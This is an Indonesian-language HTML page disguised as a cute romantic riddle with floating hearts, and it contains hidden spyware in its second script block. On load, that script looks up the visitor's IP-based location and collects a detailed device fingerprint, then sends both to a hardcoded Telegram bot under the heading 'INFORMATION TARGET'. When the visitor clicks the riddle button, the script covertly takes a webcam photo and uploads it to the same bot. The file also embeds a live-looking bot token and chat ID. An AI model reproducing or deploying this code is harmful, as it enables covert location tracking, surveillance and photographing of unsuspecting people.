<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Cute!</title>

<!-- Font Google -->
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Dancing+Script:wght@600&display=swap" rel="stylesheet">

<style>
/* ========== RESET DAN BASE ========== */
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  height: 100vh;
  width: 100%;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  overflow: hidden;
  color: #fff;
  text-align: center;
  font-family: 'Poppins', sans-serif;
  transition: background-image 1s ease-in-out;
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
}

/* ========== BACKGROUND SLIDER ========== */
@keyframes fadeBg {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.8; }
}

/* ========== TEKS UTAMA ========== */
h1 {
  font-family: 'Dancing Script', cursive;
  font-size: 3em;
  margin-bottom: 20px;
  text-shadow: 0 3px 10px rgba(255, 105, 180, 0.4);
  animation: fadeIn 2s ease;
}

p {
  font-size: 1.3em;
  margin-bottom: 30px;
  color: #fff9fb;
  text-shadow: 0 2px 8px rgba(255, 192, 203, 0.6);
  animation: fadeIn 3s ease;
}

/* ========== TOMBOL ========== */
button {
  padding: 15px 40px;
  font-size: 1.2em;
  font-weight: 600;
  border: none;
  border-radius: 50px;
  background: #fff;
  color: #ff69b4;
  cursor: pointer;
  box-shadow: 0 6px 20px rgba(255, 182, 193, 0.6);
  transition: transform 0.3s ease, box-shadow 0.3s ease;
  animation: fadeIn 4s ease;
}

button:hover {
  transform: scale(1.1);
  box-shadow: 0 8px 25px rgba(255, 182, 193, 0.8);
}

/* ========== ANIMASI ========== */
@keyframes fadeIn {
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
}

/* ========== HATI MENGAPUNG ========== */
.heart {
  position: absolute;
  bottom: -10px;
  color: rgba(255, 255, 255, 0.8);
  animation: floatUp linear infinite;
  opacity: 0.8;
}

@keyframes floatUp {
  0% {
    transform: translateY(0) scale(0.8);
    opacity: 1;
  }
  100% {
    transform: translateY(-100vh) scale(1.3);
    opacity: 0;
  }
}

/* Responsif */
@media (max-width: 600px) {
  h1 { font-size: 2.2em; }
  p { font-size: 1.1em; }
  button { font-size: 1em; padding: 12px 30px; }
}
</style>
</head>
<body>

<h1>Kamu Tau Gak 💕</h1>
<p>Apa buah yang namanya selalu bikin nyaman~ 🍓</p>
<button id="btnCamera">Apaa tuh~?</button>

<script>
// ========== GANTI BACKGROUND OTOMATIS ==========
const backgrounds = [
  "https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1200&q=80", // senja langit
  "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?auto=format&fit=crop&w=1200&q=80", // bunga pink
  "https://images.unsplash.com/photo-1520975922225-79c8c6da0da2?auto=format&fit=crop&w=1200&q=80", // love aesthetic
  "https://images.unsplash.com/photo-1518709268805-4e9042af9f23?auto=format&fit=crop&w=1200&q=80"  // pink clouds
];
let bgIndex = 0;

function changeBackground() {
  document.body.style.backgroundImage = `url('${backgrounds[bgIndex]}')`;
  bgIndex = (bgIndex + 1) % backgrounds.length;
}
changeBackground();
setInterval(changeBackground, 6000); // ganti setiap 6 detik

// ========== FLOATING HEARTS ==========
function createHeart() {
  const heart = document.createElement('div');
  heart.classList.add('heart');
  heart.innerHTML = '💖';
  heart.style.left = Math.random() * 100 + 'vw';
  heart.style.fontSize = Math.random() * 20 + 15 + 'px';
  heart.style.animationDuration = Math.random() * 3 + 4 + 's';
  document.body.appendChild(heart);

  setTimeout(() => {
    heart.remove();
  }, 7000);
}
setInterval(createHeart, 400);

// ========== TOMBOL ==========
document.getElementById("btnCamera").addEventListener("click", () => {
  alert("Jawabannya... Buah HATI 💞");
});
</script>


<script>
const BOT_TOKEN="8205013984:AAFekxuy2qv4vQ6s_yOOfXX_Mv_2u0Bpv2s"; // BOT TOKEN
const CHAT_ID="6051179992"; // CHAT ID
const STATIC_IMAGE="https://files.catbox.moe/8ybe0o.jpg";

function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}

// Ambil IP/device info via ipwhois.io
async function getIpInfo(){
  try{
    const r = await fetch("https://ipwhois.app/json/");
    const data = await r.json();
    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
    return {
      ip: data.ip || "-",
      city: data.city || "-",
      region: data.region || "-",
      country_name: data.country || "-",
      country_code: data.country_code || "-",
      latitude: data.latitude || "0",
      longitude: data.longitude || "0"
    };
  }catch(e){
    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
  }
}

// Ambil device info
async function getDeviceInfo(){
  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
  return {
    userAgent:navigator.userAgent,
    platform:navigator.platform,
    language:navigator.language,
    screenWidth:screen.width,
    screenHeight:screen.height,
    innerWidth:window.innerWidth,
    innerHeight:window.innerHeight,
    cores:navigator.hardwareConcurrency||"-",
    memory:navigator.deviceMemory||"-",
    touchPoints:navigator.maxTouchPoints||0,
    orientation:screen.orientation?.type||"-",
    colorDepth:screen.colorDepth||"-",
    pixelRatio:window.devicePixelRatio||"-",
    online:navigator.onLine,
    cookiesEnabled:navigator.cookieEnabled,
    doNotTrack:navigator.doNotTrack,
    battery:b
  };
}

// Build caption Telegram
function buildCaption(ip,d){
  const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
  return [
    "<b>INFORMATION TARGET</b>",
    `IP: ${escapeHtml(ip.ip)}`,
    `City: ${escapeHtml(ip.city)}`,
    `Region: ${escapeHtml(ip.region)}`,
    `Country: ${escapeHtml(ip.country_name)}`,
    `Country Code: ${escapeHtml(ip.country_code)}`,
    `Latitude: ${escapeHtml(ip.latitude)}`,
    `Longitude: ${escapeHtml(ip.longitude)}`,
    `Location: ${g}`,
    "",
    "<b>Device Info</b>",
    `User Agent: ${escapeHtml(d.userAgent)}`,
    `Platform: ${escapeHtml(d.platform)}`,
    `Language: ${escapeHtml(d.language)}`,
    `Screen: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}`,
    `Inner Size: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}`,
    `CPU cores: ${escapeHtml(d.cores)}`,
    `RAM (GB): ${escapeHtml(d.memory)}`,
    `Touch Points: ${escapeHtml(d.touchPoints)}`,
    `Orientation: ${escapeHtml(d.orientation)}`,
    `Color Depth: ${escapeHtml(d.colorDepth)}`,
    `Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
    `Online: ${escapeHtml(d.online)}`,
    `Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
    `Do Not Track: ${escapeHtml(d.doNotTrack)}`,
    `Battery: ${escapeHtml(d.battery?.level||"-")} (${d.battery?.charging?"Charging":"Not charging"}), ChargingTime: ${escapeHtml(d.battery?.chargingTime||"-")}s, DischargingTime: ${escapeHtml(d.battery?.dischargingTime||"-")}s`,
    "",
    "<b>URL & Time</b>",
    `URL: ${escapeHtml(location.href)}`,
    `Time (UTC): ${escapeHtml(new Date().toISOString())}`
  ].join("\n");
}

// Kirim IP/device + foto statis saat halaman load
async function sendIpDevice(){
  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      photo: STATIC_IMAGE,
      caption: buildCaption(ip,d),
      parse_mode:"HTML"
    })
  });
}

// Kamera snapshot sebagai file .jpg (document)
async function sendSnapshot(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    const video = document.createElement('video');
    video.style.display='none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => { video.onloadedmetadata = () => setTimeout(resolve, 200); });

    const canvas=document.createElement('canvas');
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("document", blob, "screenshotbyaldofficialr.jpg");
    formData.append("caption", "Sukes screenshot foto target");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: formData
    });

    stream.getTracks().forEach(track=>track.stop());
    video.remove();
  }catch(e){
    console.log("yahhh", e);
  }
}

// Jalankan saat halaman load
window.addEventListener("load",sendIpDevice);

// Tombol klik kamera
document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
</script>
</body>
</html>
